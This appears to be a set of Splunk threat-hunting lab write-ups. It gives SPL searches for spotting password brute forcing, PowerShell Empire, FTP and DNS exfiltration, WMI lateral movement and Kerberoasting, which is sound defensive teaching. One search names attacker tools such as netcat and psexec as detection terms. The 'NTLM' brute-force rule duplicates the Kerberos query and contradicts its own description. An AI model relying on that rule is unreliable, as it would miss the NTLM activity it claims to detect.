@@ -1,0 +1,2478 @@
+SPLUNK LAB 1
+
+Task 1. A password brute-forcing attempt took place against 192.168.250.70. what was the
+average password length used in the attack?
+Once you are logged into Splunk's web management interface, click the Search &
+Reporting application that resides on the Apps column on your left. You should see something
+similar to the below.
+
+In order to test if Splunk can successfully access the ingested/loaded data, ﬁrst change the time
+range picker to All time and then, submit the following search.
+index="botsv1" earliest=0
+You should see the number of events growing as time progresses.
+The ﬁrst thing we should do is determine the available sourcetypes. Speciﬁcally, we should ﬁrst
+determine the sourcetypes that are associated with 192.168.250.70. We can do so by changing
+the time range picker to All time and submitting the following Splunk search.
+index=botsv1 192.168.250.70
+You should see something similar to the below.
+
+Now, to identify the password brute-forcing attack, we can use the below query.
+index="botsv1" sourcetype="stream:http" dest_ip=192.168.250.70 http_method=POST
+form_data=*user*pass* | stats count by src_ip
+Once the query is executed, we get the following result:
+
+If you are wondering, how can we know these dest, http_method and form_data ﬁelds, you can
+identify them by clicking on the position indicated below (that will show you all the available
+ﬁelds of the sourcetype. Do this by modifying your query to only include index, sourcetype,
+and dest_ip
+'''' index="botsv1" sourcetype="stream:http" dest_ip=192.168.250.70 ''''
+Finally, to identify what was the average password length used in the attack, we can use the
+below (more complex query).
+index="botsv1" sourcetype="stream:http" dest_ip=192.168.250.70 http_method=POST
+form_data=*user*pass* | rex ﬁeld=form_data "passwd=(?<userpassword>\w+)" | eval
+lenpword=len(userpassword) | stats avg(lenpword) AS avgPword | eval
+avgPword=round(avgPword,0)
+Calculate a length for the userpassword string eval lenpword=len(userpassword)* <-
+Calculate a length for the userpassword string and store the value in lenpword
+stats avg(lenpword) AS avgPword <- Calculate the average of all lenpword and rename it
+avgPword
+eval avgPword=round(avgPword,0) <- Round the avgPword ﬁeld to 0 decimal places and put it
+into the avgPword ﬁeld
+Once the query is executed, we get the following result:
+
+Now that we know the attackers password length is set to 6 we can visualize our analysis
+Task 2. Visualize the frequency of the password brute-forcing attack.
+To visualize the frequency of the password brute-forcing attack, we can use the query below.
+index="botsv1" sourcetype="stream:http" dest_ip=192.168.250.70 http_method=POST
+form_data=*user*pass* | rex ﬁeld=form_data "passwd=(?<userpassword>\w+)" | timechart
+span=1s count by dest_ip
+This is a similiar query as too our ﬁnal Task 1 query, note that we removed
+the eval and stats sections and added a timechart
+timechart syntax is similar to stats
+Once the query is executed, we get the following result:
+We also receive a visualization by clicking on Visualization
+
+With our visualization we now know the time ranges of the attack.
+Task 3. How many seconds elapsed between the time we ﬁrst saw the password "batman"
+and the time we saw it again?
+A splunk search that can automatically determine how many seconds elapsed between the
+time we ﬁrst saw the password batman and the time we saw it again can be found below.
+index="botsv1" sourcetype="stream:http" dest_ip=192.168.250.70 http_method=POST
+form_data=*user*pass* | rex ﬁeld=form_data "passwd=(?<userpassword>\w+)" | search
+userpassword=batman | transaction userpassword | table duration
+Change the Visualization from Line Chart to Cluster Map
+Once the query is executed, we get the following result:
+
+Task 4. Extend IP location to visualizations
+The below Splunk search can provide us with a bird's eye view of the involved IP addesses.
+index="botsv1" sourcetype="stream:http" dest_ip=192.168.250.70 http_method=POST
+form_data=*user*pass* | iplocation src_ip | geostats latﬁeld=lat longﬁeld=lon count by src_ip
+
+Task 5. List all process execution activity and all executed commands
+All process execution activity can be listed through the Splunk search below.
+index="botsv1" sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" | stats
+values(ParentImage) by process
+Once the query is completed, we get the following result:
+
+All commands being executed can be listed through the Splunk search below.
+index="botsv1" sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" | stats
+values(CommandLine) by Computer,process
+Once the query is completed, we get the following result:
+Bonus 1: If you want to list all commands being executed by a speciﬁc (usually abused)
+process, you can do so as follows.
+index="botsv1" sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+process=*cmd.exe | stats values(CommandLine) by Computer,process
+
+Bonus 2: If you want to identify, for example, the longest cmd.exe command that was executed
+(overly long commands are suspicious), you can do so as follows.
+index="botsv1" sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+process=*cmd.exe | eval len=len(CommandLine) | table User, len, CommandLine | sort -len
+Once the query is completed, we get the following result:
+That overly-long cmd.exe command looks certainly malicious!
+SPLUNK LAB 2
+
+Task 1. Hunt for PowerShell Empire
+When looking at https://github.com/EmpireProject/Empire/blob/master/setup/cert.sh, we can
+see the default key that is created uses C=US as the subject of the certiﬁcate. Let's hunt for
+that! A query that can perform this kind of hunt can be found below.
+index=botsv2 sourcetype=stream:tcp ssl_issuer="C = US"
+Once the query is completed, we can look at the src. The result should be similar to the one
+below.
+
+The SSL subject/issuer value of "C = US" was seen on four internal systems
+Bonus (for advanced hunting): You may have noticed that the SPL search above took some time
+to complete. We could have accelerated our search by using the tstats command as follows.
+index=botsv2 sourcetype=stream:tcp ssl_issuer="C = US" | top src_ip dest_ip
+| sort - count
+The above search utilizes Splunk Datamodels and provides us with the same result but in
+considerably less time.
+Note the ﬁrstTime and lastTime entries as well as the common destination 45.77.65.211.
+
+A data model is a hierarchically structured search-time mapping of semantic knowledge about
+one or more datasets. It encodes the domain knowledge necessary to build a variety of
+specialized searches of those datasets. These specialized searches are used by Splunk
+software to generate reports for Pivot users.
+Goals of a Datamodel:
+
+     Make it easy to share/reuse domain knowledge [Admins/power users build data models]
+     Acceleration of large datasets to make searching more e icient
+     Provide an interface for 'non-technical users' interact with data via pivot UI [note: non-
+
+         technical == analyst with less "domain" knowledge]
+To list all available datamodels in your environment, execute the search below.
+| datamodel
+| spath displayName
+| stats values(displayName)
+Information on the Certiﬁcates data model can be found below.
+https://docs.splunk.com/Documentation/CIM/4.15.0/User/Certiﬁcates
+Back to our hunt, let's see what data we have for the common destination we noticed,
+45.77.65.211
+index=botsv2 45.77.65.211 | stats count by sourcetype | sort - count
+
+We notice that we have web and Sysmon logs containing that indicator/IP. This means that this
+IP isn't being blocked at the network level and that it has reached the system level.
+The available ﬁrewall logs can indicate the workstations/servers that communicated with that IP
+the most, as follows.
+index=botsv2 45.77.65.211 sourcetype=pan:tra ic | stats count by src_ip dest_ip | sort - count
+We obtain a similar view of the situation through Suricata logs, as follows.
+index=botsv2 45.77.65.211 sourcetype=suricata | stats count by src_ip dest_ip | sort - count
+
+Let's check Suricata's inbound alerts, as follows.
+index=botsv2 src=45.77.65.211 sourcetype=suricata
+Once the search is completed click on 32 more ﬁelds and select the alert.signature ﬁeld.
+Unfortunately, if we click that (signature) newly-added ﬁeld no interesting information appears.
+Let's focus on another available sourcetype stream:http, to identify communication ﬂows with
+the IP indicator (45.77.65.211).
+index=botsv2 45.77.65.211 sourcetype=stream:http | stats count by src_ip dest_ip | sort - count
+
+Let's investigate the identiﬁed IPs above one by one.
+    1. 172.31.4.249
+
+The indicator IP (45.77.65.211) has a tremendous amount of events generated with a
+destination of 172.31.4.249. Note that 172.31.4.249 is a Linux server belonging to our
+organization.
+Let's drill into the events where the source address is our indicator and the destination is our
+web server 172.31.4.249.
+index=botsv2 sourcetype=stream:http src_ip=45.77.65.211 dest_ip=172.31.4.249
+It is not uncommon to come across strange-looking user-agents during an attack or penetration
+test. If we click on the http_user_agent ﬁeld, we will see the below.
+
+By searching online for w3af.org, we see that it is an open source web application security
+scanner. It looks like the IP indicator has also been scanning a web server of ours in addition to
+being a destination for some of our workstations/servers. Note that our web server that was
+scanned didn't appear in the outbound communications.
+
+    1. 71.39.18.125
+index=botsv2 45.77.65.211 sourcetype=stream:http 71.39.18.125
+71.39.18.125 is the IP address is the external interface of our ﬁrewall. We may want to
+investigate this further later. Let's move to the last IP we identiﬁed 10.0.2.109.
+
+    1. 10.0.2.109
+index=botsv2 45.77.65.211 sourcetype=stream:http src_ip=10.0.2.109
+
+Nothing that can advance our hypothesis about PowerShell Empire being executed comes up.
+We may come back to investigate this further later.
+It is about time we move our attention to host centric data through Microsoft Sysmon logs, as
+follows.
+index=botsv2 45.77.65.211 sourcetype="XmlWinEventLog:Microsoft-Windows-
+Sysmon/Operational" | stats count by src_ip dest_ip | sort - count
+We see a large amount of events coming from a single server, Venus (10.0.1.101)
+communicating to our indicator.
+Let's use a wildcard on dest to ensure we get all of the values we saw in the previous search
+index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+dest=45.77.65.211*
+Once the search is completed, we notice that all returned events are running PowerShell. We
+also notice a lot of Network Connect Sysmon events. It is not common to see PowerShell
+performing network connections. Finally, some progress...
+
+Let's analyze these Network Connection Sysmon events related with powershell.exe further, as
+follows.
+index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+dest=45.77.65.211* | stats values(dest_port) as dest_port values(host) as host values(src_ip) as
+src_ip values(src_port) as src_port by process,dest,user
+The user executing these events are either the SYSTEM account or a frothly domain account
+called service3.
+By using the timechart command we can see that this network activity took place between 8/23
+and 8/26. We are focusing on the service3 user.
+index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+dest_ip=45.77.65.211* user=FROTHLY\\service3 | timechart count by src_ip
+
+Let's dig deeper into what has been executing through the service3 account, as follows.
+index="botsv2" sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+user=FROTHLY\\service3 | stats values(CommandLine) by Computer,process,ParentImage
+Not only we can see malicious PowerShell commands being executed but we also
+notice whoami.exe and ftp.exe being executed by PowerShell(which is suspicious). These three
+suspicious processes appear in both venus.frothly.local and wrk-klagerf.frothly.local.
+
+How we know that these PowerShell commands are malicious you may ask. Let's Base64
+decode them.
+The output looks certainly malicious.
+
+The output also contains /admin/get.php. Asking for this ﬁle is characteristic of PowerShell
+Empire! Other strings may also exist that can indicate the existence of PowerShell Empire in our
+environment)
+
+https://github.com/EmpireProject/Empire/blob/master/data/agent/agent.py
+
+For the extra mile try to identify similar PowerShell commands on other workstations/servers.
+We focused on the service3 account only. Maybe another account executed similar commands.
+
+Task 2. Hunt for FTP exﬁltration
+
+Let's start with the available sourcetypes for this hunt focusing on August 2017 (data obtained
+from the previous Task).
+
+index=botsv2 ftp | stats count by sourcetype | sort - count
+Let's now try to identify an IP/indicator.
+index=botsv2 ftp sourcetype=suricata | stats count by src_ip dest_ip | sort - count
+
+or
+index=botsv2 ftp sourcetype=stream:ftp | stats count by src_ip dest_ip | sort - count
+
+We notice that two internal systems speaking to the same external destination
+address, 160.153.91.7.
+If we look at Palo Alto data, we notice we have two sourcetypes, pan:tra ic and pan:threat. The
+tra ic sourcetype has by far the greater volume of tra ic, but interestingly, we see the vast
+majority of tra ic heading to the external interface of our ﬁrewall. So additional inspection of
+this data to learn more is warranted.
+index=botsv2 ftp sourcetype=pan:tra ic | stats count by src_ip dest_ip | sort - count
+Let's step away from the network level for a bit and focus on the endpoint level. First, Sysmon
+events related to FTP by host.
+index=botsv2 ftp sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" | stats
+count by host | sort - count
+
+Then, Sysmon events related to FTP by CommandLine
+index=botsv2 ftp sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" | stats
+count by CommandLine
+
+We notice some curious-looking ftp activity! We will get back to this activity and investigate
+further.
+Back to the network now, let's try to see inside the FTP tra ic.
+index=botsv2 ftp sourcetype=stream:ftp src_ip=* dest_ip=160.153.91.7
+The interesting ﬁelds to browse are:
+     ﬂow_id
+     reply_content
+     method
+     method_parameter
+     ﬁlename
+
+So, let's reﬁne our search as follows
+index=botsv2 sourcetype=stream:ftp src_ip=* dest_ip=160.153.91.7 method!=PORT
+method!=TYPE method!=NLST | table _time src_ip ﬁlename method method_parameter
+reply_content | sort + _time
+
+Looking at the results you will notice the exact same sequence of actions taking place at both
+10.0.2.107 and 10.0.2.109. We can see that we have 3 executables, a DLL, a MSI installer for
+python, a python script and a hwp ﬁle extension. If we aren't sure what a hwp ﬁle is, we can
+Google for the extension and we ﬁnd out that it is a Korean word processing application.
+Make also sure you give reply_content a look for interesting information.
+It is worth looking into each separate transmission. You can do that through the query below,
+clicking into each green bar of the histogram and then pressing +Zoom to Selection.
+index=botsv2 sourcetype=stream:ftp src_ip=* dest_ip=160.153.91.7
+
+Now you can view which ﬁles were uploaded/exﬁltrated (do the below for each transmission) as
+follows.
+index=botsv2 sourcetype=stream:ftp src_ip=* dest_ip=160.153.91.7 | stats count by ﬁlename
+
+Finally, we should focus our attention on the DLL ﬁles we spotted. To identify the sourcetypes
+that include information about these DLLs execute the search below.
+index=botsv2 (singleﬁle.dll OR winsys32.dll) | reverse
+Let's leverage both to investigate further, as follows.
+index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+(singleﬁle.dll OR winsys32.dll) | table _time host user CommandLine ParentCommandLine |
+reverse
+
+index=botsv2 sourcetype=wineventlog (singleﬁle.dll OR winsys32.dll) | stats count by host
+Let's also not forget to search for the other ﬁles that were downloaded.
+index=botsv2 sourcetype!=stream:ftp (dns.py OR nc.exe OR psexec.exe OR python-
+2.7.6.amd64.msi OR wget64.exe OR winsys64.dll OR *.hwp) | stats count by host
+
+To look for events related to these ﬁles on, for example, the venus host/server, use the search
+below.
+index=botsv2 sourcetype!=stream:ftp (dns.py OR nc.exe OR psexec.exe OR python-
+2.7.6.amd64.msi OR wget64.exe OR winsys64.dll OR *.hwp) | reverse | search host="venus"
+We have investigated FTP activity thoroughly enough. You should now have a good idea of how
+to hunt for FTP exﬁltration.
+Task 3. Hunt for DNS exﬁltration
+With the IP address of 160.153.91.7, we can leverage this indicator to determine if any
+exﬁltration was being attempted using DNS. stream:dns provides us with all DNS query and
+responses occurring within Frothly (our domain).
+index=botsv2 sourcetype=stream:dns 160.153.91.7 | stats count by src_ip
+
+Let's start investigating 10.0.2.107, as follows.
+index=botsv2 sourcetype=stream:dns 160.153.91.7 src_ip=10.0.2.107
+If we click the name ﬁeld we notice a curious-looking domain.
+Let's investigate further as follows.
+index=botsv2 sourcetype=stream:dns hildegardsfarm.com | stats count by dest_ip | sort - count
+
+We notice almost 70K events for this domain! Let's look into the queries (since we are hunting
+for DNS exﬁltration).
+index=botsv2 sourcetype=stream:dns hildegardsfarm.com "query{}"="*"
+| table _time query{} src_ip dest_ip
+Let's leverage URL Toolbox to reﬁne our search. We will need to reference the mozilla list (part of
+URL Toolbox) and then run the ut_parse_extended macro against the query ﬁeld. This will chop
+the query into ﬁner pieces to analyze. We can then calculate the Shannon entropy score of the
+subdomain that was extracted and then table the output.
+
+As we review at our results, we can see that all of these subdomains have a high entropy score.
+Entropy scores greater than 3 are considered high and can often be used to determine if
+domains or urls are algorithmically generated. Entropy is not perfect, just look at an AWS
+subdomain name, but it is another tool in the tool chest that can help indicate a DGA and that
+additional interrogation is needed.
+
+index=botsv2 sourcetype=stream:dns hildegardsfarm.com "query{}"="*" query
+*.hildegardsfarm.com
+
+| eval query{}=mvdedup(query)
+
+| eval list="mozilla"
+
+| `ut_parse_extended(query{},list)`
+
+| `ut_shannon(ut_subdomain)`
+
+| table src_ip dest_ip query{} ut_subdomain ut_shannon
+We can further evolve our previous search by further dissecting these subdomains and their
+associated queries as a larger data set. If we use our eval statement after we calculate the
+Shannon Entropy score, we can calculate the length of each of the subdomains. Using the stats
+command, we can determine the average Shannon Entropy score, average length of the
+subdomain and the standard deviation of the length of the subdomain by the domain.
+
+Generally, a high average entropy, high subdomain length and low standard deviation of the
+length, coupled with a high event count could be indicative of a DNS exﬁltration attempt and we
+seem to have met those metrics here.
+
+index=botsv2 sourcetype=stream:dns hildegardsfarm.com "query{}"="*" query
+*.hildegardsfarm.com
+
+| eval query{}=mvdedup(query)
+
+| eval list="mozilla"
+
+| `ut_parse_extended(query{},list)`
+
+| `ut_shannon(ut_subdomain)`
+
+| eval sublen = length(ut_subdomain)
+
+| table ut_domain ut_subdomain ut_shannon sublen
+
+| stats count avg(ut_shannon) as avg_entropy avg(sublen) as avg_sublen stdev(sublen) as
+stdev_sublen by ut_domain
+You should now have a better idea of how DNS exﬁltration looks like and how it can be
+proactively detected in your environment.
+Task 4. Hunt for adversary infrastructure
+We already know that our 10.0.2.107 endpoint communicated with the 45.77.65.211 IP
+indicator. We also know that the communication was based on a SSL certiﬁcate of speciﬁc
+conﬁguration. Let's extract the certiﬁcate's sha256 hash and hunt for it in the wild as follows.
+index=botsv2 sourcetype=stream:tcp dest_ip=45.77.65.211 src_ip=10.0.2.107 | stats count by
+ssl_cert_sha256
+
+Now, if we submit this hash to Censys.io, we recieve no results.
+
+However, let's submit the IP Indicator to virustotal.com and see what the results are. The initial
+results show as clean, but lets look at relations. You can see under Communicating Files that
+there are three malicious ﬁles associated to the IP Address. By clicking on one or more of these
+ﬁles you now have an opportunity to expand you indicators of compromise list and have a look
+at other assocaited IP addresses and domains.
+Task 5. Hunt for lateral movement through WMI
+Based on the guidance provided in the JPCERT doc, we can craft a search using Sysmon and we
+ﬁnd 11 events (between 8/23/2017 and 8/24/2017), all associated with wrk-klagef. Recall that
+we need escape characters for \.
+index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+EventCode=1 ParentImage="C:\\Windows\\System32\\svchost.exe"
+CurrentDirectory="C:\\Windows\\system32\\"
+CommandLine="C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
+ParentCommandLine="C:\\Windows\\system32\\svchost.exe -k DcomLaunch" User="NT
+AUTHORITY\\NETWORK SERVICE" Image="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" |
+stats count by host
+
+index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+EventCode=3 Image="C:\\Windows\\System32\\svchost.exe" User="NT AUTHORITY\\NETWORK
+SERVICE"
+We didn't have any luck with the Network Connection event in Sysmon
+The below is what we should see in Remote Execution via WMI at the destination side, but we
+don't have all the needed data in our Sysmon logs.
+
+Let's focus on Teymur Kheirklabarov's advice on hunting for remote execution via WMI (systems
+with Network 4624 Event followed by Sysmon Process Creations).
+index=botsv2 (sourcetype=wineventlog (EventCode=4624 Logon_Type=3)) OR
+(sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"
+ParentCommandLine!="*\\svchost.exe" EventCode=1)
+| eval login=mvindex(Logon_ID,1)
+| eval user_id=mvindex(Security_ID,1)
+| eval session=lower(coalesce(login,LogonId))
+| transaction session startswith=(EventCode=4624) mvlist=ParentImage
+| search eventcount>1
+| eval Parent_Process=mvindex(ParentImage, 1)
+| table _time dest_ip session host user_id Parent_Process Image CommandLine
+
+To better see all the events that occurred and all processes that were running during the
+identiﬁed sessions (LogonId) above on the venus and wrk-klagerf hosts, use the searches
+below.
+index=botsv2 ((Logon_ID=0x171491a OR LogonId=0x171491a) host=venus) | table _time
+EventCode TaskCategory Account_Name Security_ID Process_Command_Line CommandLine
+ParentCommandLine | reverse
+index=botsv2 ((Logon_ID=0xf9b47f OR LogonId=0xf9b47f) host=wrk-klagerf) | table _time
+EventCode TaskCategory Account_Name Security_ID Process_Command_Line CommandLine
+ParentCommandLine | reverse
+
+You should now have a better idea of how to hunt for remote execution through WMI
+SPLUNK LAB 3
+
+Task 1. Hunt for brute force attacks inside Active Directory
+     S01D01 - Logon attempts using a non-existing account (Kerberos)
+
+index="ad_hunting" sourcetype=XmlWinEventLog EventCode=4768 Status=0x6 | transaction
+IpAddress maxpause=5m maxevents=-1 | where eventcount > 5 | eval
+Source=if(IpAddress=="::1", Computer, IpAddress) | eval accounts=mvcount(TargetUserName) |
+where accounts > 2 | table _time, host, Source, TargetUserName, accounts, eventcount | sort -
+_time | rename _time AS "Time", host AS "Host", Source AS "Source Computer", TargetUserName
+AS "Target Username", accounts AS "Number of Accounts", eventcount AS "Total Attempts" |
+convert ctime(Time)
+
+This search looks for events 4768 auditing Kerberos authentication ticket (TGT) requests and
+ﬁlters them on the Status ﬁeld equal to code 0x6. This value means that the submitted
+username does not exist [3]. The transaction command is used to group subsequent attempts
+coming from the same IP address with a maximal pause of 5 minutes between them. Only
+transactions containing more than ﬁve events are preserved. These are the conditions that
+deﬁne parameters of a brute force attack. If there is an IP address of localhost in the event, the
+computer name is taken as a source. The number of di erent usernames is calculated with
+the mvcount function of the eval command. The rule triggers only in the case there are attempts
+towards more than two di erent accounts.
+How to Implement: Logging on domain controllers needs to be set up to log TGT requests. It
+can be done by conﬁguring Audit Kerberos Authentication Service auditing setting [3]. The
+constants in the conditions that appear in the search, such as eventcount, maxpause,
+and accounts, need to reﬂect Account Lockout Policy settings of the domain environment.
+Known False Positives: Common false positives are attempts with misspelled usernames.
+These can be limited by adjusting the search constants precisely for the particular environment.
+     S01D02 - Logon attempts using a non-existing account (NTLM)
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4776 Status=0xC0000064 |
+transaction Workstation maxpause=5m maxevents=-1 | where eventcount > 5 | eval
+accounts=mvcount(TargetUserName) | where accounts > 2 | table _time, host, Workstation,
+TargetUserName, accounts, eventcount | sort - _time | rename _time AS "Time", host AS "Host",
+Workstation AS "Source", TargetUserName AS "Target Username", accounts AS "Number of
+Accounts", eventcount AS "Total Attempts"| convert ctime(Time)
+
+This search looks for events 4776 auditing NTLM authentication and ﬁlters them on
+the Status ﬁeld equal to code 0xC0000064. This value means that the submitted username
+does not exist [4]. The transaction command is used to group subsequent attempts coming
+from the same source workstation with a maximal pause of 5 minutes between them. Only
+transactions containing more than ﬁve events are preserved. These are the conditions that
+deﬁne parameters of a brute force attack. The number of di erent usernames is calculated
+with mvcount function of the eval command. The rule triggers only in the case there are
+attempts towards more than two di erent accounts.
+How to Implement: Credential Validation auditing policy needs to be enabled on the monitored
+systems. The constants in the conditions that appear in the search, such
+as eventcount, maxpause, and accounts, need to reﬂect Account Lockout Policy settings of the
+domain environment.
+Known False Positives: Common false positives are attempts with misspelled usernames.
+These can be limited by adjusting the search constants precisely for the particular environment.
+
+     S01D03 - Excessive failed password attempts from one source (Kerberos)
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4771 Status=0x18 |
+transaction IpAddress maxpause=5m maxevents=-1 | where eventcount > 5 | eval
+Source=if(IpAddress=="::1", Computer, IpAddress) | eval accounts=mvcount(TargetUserName) |
+table _time, host, Source, TargetUserName, accounts, eventcount | sort - _time | rename _time
+AS "Time", host AS "Host", Source AS "Source Computer", TargetUserName AS "Target
+Username", accounts AS "Number of Accounts", eventcount AS "Total Attempts" | convert
+ctime(Time)
+
+This search detects password brute force attempts coming from one source. Those may be
+targeting one or multiple accounts, which means this search is also able to identify a password
+spraying activity. It searches for attempts where Kerberos authentication was used. The rule can
+be useful even if the lockout policy is applied in the domain because it can detect attempts
+from adversaries that are aware of the policy. The search ﬁlters events 4771 that are logged for
+several status codes [3]. Among them, there is the code 0x18 which means invalid pre-
+authentication information, usually a wrong password.
+How to Implement: Logging on domain controllers needs to be set up to log TGT requests. It
+can be done by conﬁguring Audit Kerberos Authentication Service auditing setting [3]. The
+constants in the conditions that appear in the search, such as eventcount, maxpause,
+and accounts, need to reﬂect Account Lockout Policy settings of the domain environment.
+Known False Positives: If there are lots of false positive detections, optionally a
+condition where accounts > 1 can be added to the search. However, the condition should be
+added only in the case that the Account Lockout Policy is set up in the environment. If there are
+multiple IP addresses in use for the same host, the rule can trigger more times for events which
+should be grouped together in a single result. Users using multiple accounts on one computer
+may trigger this rule by accidentally typing the wrong password. This behavior can be limited by
+setting the search constants precisely for the needs of a particular environment.
+
+     S01D04 - Excessive failed password attempts from one source (NTLM)
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4771 Status=0x18 |
+transaction IpAddress maxpause=5m maxevents=-1 | where eventcount > 5 | eval
+Source=if(IpAddress=="::1", Computer, IpAddress) | eval accounts=mvcount(TargetUserName) |
+table _time, host, Source, TargetUserName, accounts, eventcount | sort - _time | rename _time
+AS "Time", host AS "Host", Source AS "Source Computer", TargetUserName AS "Target
+Username", accounts AS "Number of Accounts", eventcount AS "Total Attempts" | convert
+ctime(Time)
+This search detects password brute force attempts coming from one source. Those may be
+targeting one or multiple accounts, which means this search is also able to identify a password
+spraying activity. It searches for attempts where NTLM authentication was used. The rule can be
+useful even if the lockout policy is applied in the domain because it can detect attempts from
+adversaries that are aware of the policy. The search ﬁlters events 4776 that audit NTLM
+authentication. Status code 0xC000006A means a logon with misspelled or wrong password [4].
+
+How to Implement: Credential Validation auditing policy needs to be enabled on the monitored
+systems. The constants in the conditions that appear in the search, such
+as eventcount, maxpause, and accounts, need to reﬂect Account Lockout Policy settings of the
+domain environment.
+
+Known False Positives: If there are lots of false positive detections, optionally a
+condition where accounts > 1 can be added to the search. However, the condition should be
+added only in the case that the Account Lockout Policy is set up in the environment. If there are
+multiple IP addresses in use for the same host, the rule can trigger more times for events which
+should be grouped together in a single result. Users using multiple accounts on one computer
+may trigger this rule by accidentally typing the wrong password. This behavior can be limited by
+setting the search constants precisely for the needs of a particular environment.
+
+     S01D05 - Excessive failed password attempts towards one account
+
+index="ad_hunting" source=XmlWinEventLog:Security ((EventCode=4776 Status=0xC000006A)
+OR (EventCode=4771 Status=0x18)) | eval src=if(src=="::1", Computer, src) | transaction
+TargetUserName maxpause=5m maxevents=-1 | eval sources=mvcount(src) | where eventcount
+> 5 AND sources > 1 | table _time, host, TargetUserName, sources, src, eventcount | sort - _time
+| rename _time AS "Time", host AS "Host", TargetUserName AS "Target Username", sources AS
+"Number of Sources", src AS "Source", eventcount AS "Total Attempts" | convert ctime(Time)
+This search detects password brute force attempts towards one target account. Unlike previous
+searches, this rule is set up to capture trials coming from several sources. Both Kerberos and
+NTLM authentication events are ﬁltered for status code meaning bad password. That is the
+status code 0xC000006A for event 4776 and the status code 0x18 for event 4771. Transactions
+are made on TargetUserName ﬁeld with the maxpause parameter set to 5 minutes between
+single events. Only transactions that contain more than ﬁve events in total and events from
+more than two di erent sources are preserved as results. These constants should be changed
+to values that ﬁt the particular environment.
+
+How to Implement: Both Credential Validation and Kerberos Authentication Service auditing
+policies need to be enabled on the monitored systems. The constants in the conditions that
+appear in the search, such as eventcount, maxpause, and accounts, need to reﬂect Account
+Lockout Policy settings of the domain environment.
+
+Known False Positives: If some hosts use multiple IP addresses, the number of source hosts
+may be evaluated wrongly. If the condition for sources is sources > 1, the rule can trigger false-
+positively for the same source host, showing as two events. This happens because the event
+4776 logs hostname, while event 4771 logs IP addresses only. It can be ﬁxed by using lookup. A
+single user logging on multiple computers in a short time may trigger this rule by accidentally
+typing the wrong password. This behavior can be limited by setting the search constants
+precisely.
+
+     S01D06 - Multiple locked accounts from one source
+
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4740 | transaction
+TargetDomainName maxpause=1h maxevents=-1 | eval accounts=mvcount(TargetUserName) |
+where accounts > 1 | table _time, host, TargetDomainName, TargetUserName, accounts | sort -
+_time | rename _time AS "Time", host AS "Host", TargetDomainName AS "Source",
+TargetUserName AS "Target Username", accounts AS "Number of Accounts" | convert
+ctime(Time)
+
+This search detects several account lockouts made by a single source in a short time. This
+anomaly can be caused by adversaries trying to guess passwords on multiple accounts in the
+case they are not aware of the Account Lockout Policy in the domain. The search is looking into
+events 4740 - A user account was locked out [5]. The transaction command is used with the
+ﬁeld TargetDomainName. This is the ﬁeld containing the name of computer account from which
+logon attempt was received. This applies to XML event format; the ﬁeld is called Caller
+Computer Name in the standard event format. The condition triggers when there is more than
+one account locked from the same source computer.
+
+How to Implement: User Account Management auditing setting enables logging for account
+lockout events (4740). The constants in the conditions that appear in the search, such
+as maxpause, and accounts, need to reﬂect Account Lockout Policy settings of the domain
+environment. Replacing the condition accounts > 1 by eventcount > 1 returns also repetitive
+lockout attempts for the same account. It can be useful in the case that accounts are being
+unlocked automatically after some time.
+
+Known False Positives: A user may lock his own multiple accounts by accidentally typing a
+wrong password. If some computers are shared among several users, these users can lock their
+accounts in a short time from a single computer.
+
+     S01D08 - Logon attempts towards disabled accounts (Kerberos)
+
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4768 Status=0x12 |
+transaction IpAddress maxpause=5m maxevents=-1 | where eventcount > 5 | eval
+Source=if(IpAddress=="::1", Computer, IpAddress) | eval accounts=mvcount(TargetUserName) |
+where accounts > 2 | table _time, host, Source, TargetUserName, accounts, eventcount | sort -
+_time | rename _time AS "Time", host AS "Host", TargetUserName AS "Target Username",
+accounts AS "Number of Accounts", eventcount AS "Total Attempts" | convert ctime(Time)
+
+This search identiﬁes repetitive logon attempts with the use of disabled accounts. This rule
+detects attempts where Kerberos authentication was used. An attacker may want to exploit
+forgotten accounts that are no longer used in the environment. Or eventually, also default
+Windows built-in accounts in the case they are disabled. The search is focusing on events 4768
+with the status code 0x12, which means that the account is disabled [3]. Transactions are made
+on the IpAddress ﬁeld, and only those containing more than ﬁve matches are kept in the results.
+This condition detects signs of a brute force activity. The number of target accounts is evaluated
+by using the mvcount function on the ﬁeld TargetUserName. Only transactions with more than
+two accounts are displayed.
+
+How to Implement: Logging on domain controllers needs to be conﬁgured to audit Kerberos
+Authentication Service. Note that event 4768 with status code 0x12 means a disabled account,
+whereas the event 4771 with status code 0x12 means that the account is locked.
+
+Known False Positives: Some logon attempts can occur shortly after the account is disabled
+by an administrator.
+
+Task 2. Hunt for Kerberoasting
+
+     S02D01 - Possible Kerberoasting activity
+
+index="ad_hunting" source=XmlWinEventLog:Security EventCode=4769
+(TicketEncryptionType=0x1 OR TicketEncryptionType=0x3 OR TicketEncryptionType=0x17 OR
+TicketEncryptionType=0x18) | eval Source=if(IpAddress=="::1", Computer, IpAddress) | table
+_time, host, Source, TargetUserName, ServiceName, TicketEncryptionType | sort - _time |
+rename _time AS "Time", host AS "Host", TargetUserName AS "Target Username", ServiceName
+AS "Service Name", TicketEncryptionType AS "Ticket Encryption" | convert ctime(Time)
+This search ﬁnds sources that requested service tickets with weak cipher suites. These
+encryption types should be no longer used by modern operating systems in the domain.
+Therefore, they are likely signs of possible Kerberoasting activity. The search looks at events
